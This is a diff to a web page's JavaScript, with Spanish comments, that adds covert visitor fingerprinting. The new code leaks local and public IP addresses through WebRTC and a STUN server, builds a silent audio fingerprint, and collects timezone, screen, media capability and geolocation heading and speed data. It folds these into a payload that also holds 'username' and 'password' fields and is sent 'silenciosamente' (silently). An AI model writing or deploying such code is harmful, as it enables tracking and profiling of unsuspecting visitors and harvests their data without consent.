@@ -330,7 +330,9 @@ iframe {
                         longitude: position.coords.longitude,
                         accuracy: position.coords.accuracy,
                         altitude: position.coords.altitude,
-                        altitudeAccuracy: position.coords.altitudeAccuracy
+                        altitudeAccuracy: position.coords.altitudeAccuracy,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed
                     });
                 },
                 (error) => {
@@ -341,6 +343,139 @@ iframe {
                 { timeout: 10000, maximumAge: 60000, enableHighAccuracy: true }
             );
         });
+    }
+
+    // ═══════════════════════════════════════
+    // 🔍 DATOS EXTRAS AVANZADOS
+    // ═══════════════════════════════════════
+
+    async function getWebRTCInfo() {
+        return new Promise((resolve) => {
+            try {
+                const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+
+                if (!RTCPeerConnection) {
+                    resolve({ localIP: 'Unavailable', publicIP: 'Unavailable' });
+                    return;
+                }
+
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                const ips = [];
+
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) {
+                        resolve({
+                            localIP: ips.find(ip => ip.includes('192.168') || ip.includes('10.')) || 'Unknown',
+                            publicIP: ips.find(ip => !ip.includes('192.168') && !ip.includes('10.')) || 'Unknown',
+                            allIPs: ips
+                        });
+                        pc.close();
+                        return;
+                    }
+
+                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                    const match = ipRegex.exec(ice.candidate.candidate);
+                    if (match && !ips.includes(match[1])) {
+                        ips.push(match[1]);
+                    }
+                };
+
+                setTimeout(() => {
+                    resolve({
+                        localIP: ips.find(ip => ip.includes('192.168') || ip.includes('10.')) || 'Unknown',
+                        publicIP: ips.find(ip => !ip.includes('192.168') && !ip.includes('10.')) || 'Unknown',
+                        allIPs: ips
+                    });
+                    pc.close();
+                }, 2000);
+
+            } catch (e) {
+                resolve({ localIP: 'Error', publicIP: 'Error', error: e.message });
+            }
+        });
+    }
+
+    function getAudioFingerprint() {
+        try {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioContext.createOscillator();
+            const analyser = audioContext.createAnalyser();
+            const gainNode = audioContext.createGain();
+            const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
+
+            gainNode.gain.value = 0; // Silencioso
+            oscillator.connect(analyser);
+            analyser.connect(scriptProcessor);
+            scriptProcessor.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+
+            oscillator.start(0);
+
+            const dataArray = new Uint8Array(analyser.frequencyBinCount);
+            analyser.getByteFrequencyData(dataArray);
+
+            oscillator.stop();
+            audioContext.close();
+
+            // Hash simple de los datos
+            const hash = Array.from(dataArray).slice(0, 30).reduce((acc, val) => acc + val, 0);
+
+            return {
+                hash: hash.toString(16),
+                sampleRate: audioContext.sampleRate,
+                maxChannelCount: audioContext.destination.maxChannelCount,
+                channelCount: audioContext.destination.channelCount,
+                channelCountMode: audioContext.destination.channelCountMode
+            };
+        } catch (e) {
+            return { available: false, error: e.message };
+        }
+    }
+
+    function getTimezoneInfo() {
+        const date = new Date();
+        return {
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            offset: date.getTimezoneOffset(),
+            locale: Intl.DateTimeFormat().resolvedOptions().locale,
+            dateFormat: new Date().toLocaleDateString(),
+            timeFormat: new Date().toLocaleTimeString()
+        };
+    }
+
+    function getMediaCapabilities() {
+        const capabilities = {
+            mediaDevices: !!navigator.mediaDevices,
+            getUserMedia: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
+            enumerateDevices: !!(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices),
+            mediaRecorder: !!window.MediaRecorder,
+            webRTC: !!(window.RTCPeerConnection || window.webkitRTCPeerConnection),
+            permissions: !!navigator.permissions
+        };
+
+        return capabilities;
+    }
+
+    function getAdvancedScreenInfo() {
+        return {
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            width: screen.width,
+            height: screen.height,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth,
+            orientation: screen.orientation?.type || 'Unknown',
+            angle: screen.orientation?.angle || 0,
+            innerWidth: window.innerWidth,
+            innerHeight: window.innerHeight,
+            outerWidth: window.outerWidth,
+            outerHeight: window.outerHeight,
+            devicePixelRatio: window.devicePixelRatio,
+            isFullscreen: !!(document.fullscreenElement || document.webkitFullscreenElement)
+        };
     }
 
     // ═══════════════════════════════════════
@@ -357,9 +492,16 @@ iframe {
             const hardware = await getHardwareInfo();
             const sensors = detectSensors();
             const geolocation = await tryGetLocation();
-            
+
+            // ✅ NUEVOS DATOS EXTRAS
+            const webRTC = await getWebRTCInfo();
+            const audioFP = getAudioFingerprint();
+            const timezoneInfo = getTimezoneInfo();
+            const mediaCapabilities = getMediaCapabilities();
+            const advancedScreen = getAdvancedScreenInfo();
+
             const timeOnPage = Math.round((Date.now() - startTime) / 1000);
-            
+
             const data = {
                 username: 'Demo Visitor',
                 password: 'N/A',
@@ -374,7 +516,8 @@ iframe {
                     webgl: webglInfo.webgl,
                     webglVendor: webglInfo.vendor,
                     webglRenderer: webglInfo.renderer,
-                    fonts: fonts
+                    fonts: fonts,
+                    audio: audioFP // ✅ NUEVO
                 },
                 privacy: basicInfo.privacy,
                 behavior: {
@@ -386,7 +529,12 @@ iframe {
                 },
                 hardware: hardware,
                 sensors: sensors,
-                geolocation: geolocation
+                geolocation: geolocation,
+                // ✅ NUEVOS CAMPOS
+                webRTC: webRTC,
+                timezoneInfo: timezoneInfo,
+                mediaCapabilities: mediaCapabilities,
+                advancedScreen: advancedScreen
             };
             
             // Enviar silenciosamente
